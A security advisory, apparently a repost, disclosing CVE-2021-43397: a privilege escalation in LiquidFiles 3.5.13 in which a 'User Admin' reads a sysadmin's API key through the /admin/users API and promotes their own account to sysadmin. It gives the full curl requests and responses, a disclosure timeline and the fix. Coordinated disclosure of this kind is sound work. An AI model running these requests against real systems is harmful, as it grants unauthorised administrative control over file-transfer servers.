@@ -1,0 +1,206 @@
+id: 37057
+date: 11/17/2021
+title: LiquidFiles 3.5.13 Privilege Escalation Vulnerability
+author: Eliana Cannella
+cves: CVE-2021-43397
+
+===============================================================================
+                  title: LiquidFiles Privilege Escalation
+                product: LiquidFiles v3.5.13
+     vulnerability type: Privilege Escalation
+               severity: Medium
+           CVSSv3 score: 6.7
+          CVSSv3 vector: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L
+                  found: 2021-10-29
+                     by: Riccardo Spampinato, Eliana Cannella, Valerio
+Casalino
+===============================================================================
+
+[EXECUTIVE SUMMARY]
+LiquidFiles is a secure file transfer system for person-to-person email
+communication.
+During an engagement for our customer we discovered a Privilege Escalation
+from "User Admin" user to "System Administrator" user.
+Using LiquidFiles API, a "User Admin" user can list all the application
+registered users, retrieving information such as their API keys, including
+those of the System Administrators. As per LiquidFiles documentation, API
+key is used as HTTP basic authentication in order to authenticate to the
+LiquidFiles system.
+A malicious "User Admin" user, by using a 'System Administrator's API key,
+can obtain the role of System Administrator and can administer all aspects
+of the LiquidFiles system.
+The impact of a successful attack includes: obtaining access to all aspects
+of the LiquidFiles system of the application via the System Administrator
+API key.
+
+
+[VULNERABLE VERSIONS]
+The following version of LiquidFiles system is affected by the
+vulnerability; previous versions may be vulnerable as well:
+- LiquidFiles v3.5.13
+
+
+[TECHNICAL DETAILS]
+It is possible to reproduce the issue following these steps:
+1. Get the API key of your own user-admins user;
+2. With your own user-admins user's API key, get a sysadmins' API key via
+/admin/users API;
+3. With sysadmins' API key retrieved at the step below, issue
+/admin/users/<user-admins_user_id> API modifying the group of your
+user-admins user from "user-admins" to "sysadmins";
+4. You are now a sysadmins user. You can verify it by either login again
+with your own user via web GUI (you are now prompted to set a fallback
+password to use in case LDAP authentication fails) or by issuing
+/admin/users/<user-admins_user_id> API to view your own user.
+
+
+Below a full transcript of the HTTP requests and responses used to raise
+the vulnerability:
+
+1. Get the API key of your own user-admins user
+
+cURL Request:
+curl -X POST -H "Accept: application/json" -H "Content-Type:
+application/json" -d
+'{"user":{"email":"[user-admins_user_mail]","password":"[CENSORED]"}}'
+https://[CENSORED]/login
+
+Response:
+{"user":{"api_key":"[user-admins_user_API_key]"}}
+
+
+2. Get a sysadmins' API key
+
+cURL Request:
+curl -s -X GET --user "[user-admins_user_API_key]:x" -H "Accept:
+application/json" -H "Content-Type: application/json" https://
+[CENSORED]/admin/users
+
+Response:
+[TRUNCATED]
+{"user":
+  {
+    "id": "[CENSORED]",
+    "email": "[CENSORED]",
+    "name": "[CENSORED]",
+    "group": "sysadmins",
+    "max_file_size": 0,
+    "filedrop": "disabled",
+    "filedrop_email": "disabled",
+    "api_key": "[sysadmins_user_API_key]",
+    "ldap_authentication": "false",
+    "locale": "",
+    "time_zone": "",
+    "strong_auth_type": "",
+    "strong_auth_username": "",
+    "delivery_action": "",
+    "phone_number": "",
+    "last_login_at": "2021-10-29 10:02:11 UTC",
+    "last_login_ip": "[CENSORED]",
+    "created_at": "2020-06-30 10:49:38 UTC"
+  }
+},
+[TRUNCATED]
+
+
+3. Modify the group of your own user-admins user from "user-admins" to
+"sysadmins"
+
+cURL Request:
+cat <<EOF | curl -s -X PUT --user "[sysadmins_user_API_key]:x" -H "Accept:
+application/json" -H "Content-Type: application/json" -d @- https://
+[CENSORED]/admin/users/<user-admins_user_id>
+{"user":
+  {
+    "name": "[user-admins_user_name]",
+    "group": "sysadmins"
+  }
+}
+EOF
+
+Response
+{"user":
+  {
+    "id": "[CENSORED]",
+    "email": "[CENSORED]",
+    "name": "[CENSORED]",
+    "group": "sysadmins",
+    "max_file_size": 0,
+    "filedrop": "disabled",
+    "filedrop_email": "disabled",
+    "api_key": "[CENSORED]",
+    "ldap_authentication": "true",
+    "locale": "",
+    "time_zone": "",
+    "strong_auth_type": "",
+    "strong_auth_username": "",
+    "delivery_action": "",
+    "phone_number": "",
+    "last_login_at": "2021-11-03 13:31:58 UTC",
+    "last_login_ip": "[CENSORED]",
+    "created_at": "2021-03-03 11:48:37 UTC"
+  }
+}
+
+
+4. Verify that your own user-admins user is now a sysadmins one.
+
+cURL Request
+curl -X GET -H "Accept: application/json" -H "Content-Type:
+application/json" --user [user-admins_user_API_key]:x https://
+[CENSORED]/admin/users/<user-admins_user_id>
+
+Response
+{"user":
+  {
+    "id": "[CENSORED]",
+    "email": "[CENSORED]",
+    "name": "[CENSORED]",
+    "group": "sysadmins",
+    "max_file_size": 0,
+    "filedrop": "disabled",
+    "filedrop_email": "disabled",
+    "api_key": "[CENSORED]",
+    "ldap_authentication": "true",
+    "locale": "",
+    "time_zone": "",
+    "strong_auth_type": "",
+    "strong_auth_username": "",
+    "delivery_action": "",
+    "phone_number": "",
+    "last_login_at": "2021-11-03 13:34:36 UTC",
+    "last_login_ip": "[CENSORED]",
+    "created_at": "2021-03-03 11:48:37 UTC"
+  }
+}
+
+
+[VULNERABILITY REFERENCE]
+The following CVE ID was allocated to track the vulnerabilities:
+CVE-2021-43397
+
+
+[DISCLOSURE TIMELINE]
+2021-11-02  Vulnerability submitted to vendor through vendor support portal.
+            Vendor requested more info and acknowledged the problem later.
+2021-11-04  Researcher requested to allocate a CVE number.
+            Vendor released a fix for the reported issue.
+2021-11-09  Researcher requested to publicly disclose the issue; public
+            coordinated disclosure.
+
+
+[MITIGATION]
+As per vendor suggestion, the vulnerability could be mitigated in versions
+prior to 3.6.3 by disabling API in Admins groups.
+
+
+[SOLUTION]
+Version 3.6.3 (released 2021-11-09)
+https://man.liquidfiles.com/release_notes/version_3-6-x.html
+
+
+[NOTE]
+Please note that the issue described in this advisory can be also raised
+via Web GUI LiquidFiles Admin panel.
+
+#  0day.today [2023-03-24]  #
